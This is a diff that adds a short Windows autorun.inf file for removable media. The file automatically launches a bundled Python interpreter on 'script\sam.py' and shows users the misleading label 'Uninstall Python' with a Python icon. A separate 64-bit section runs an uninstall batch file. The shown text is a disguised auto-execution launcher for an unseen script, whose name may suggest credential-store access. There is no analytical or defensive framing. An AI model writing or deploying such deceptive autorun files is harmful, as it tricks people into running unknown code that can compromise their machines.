@@ -1,0 +1,7 @@
+[autorun]
+open=python\python.exe script\sam.py
+icon=python.ico
+action=Uninstall Python
+
+[AutoRun.Amd64]
+open=python\uninstall.bat
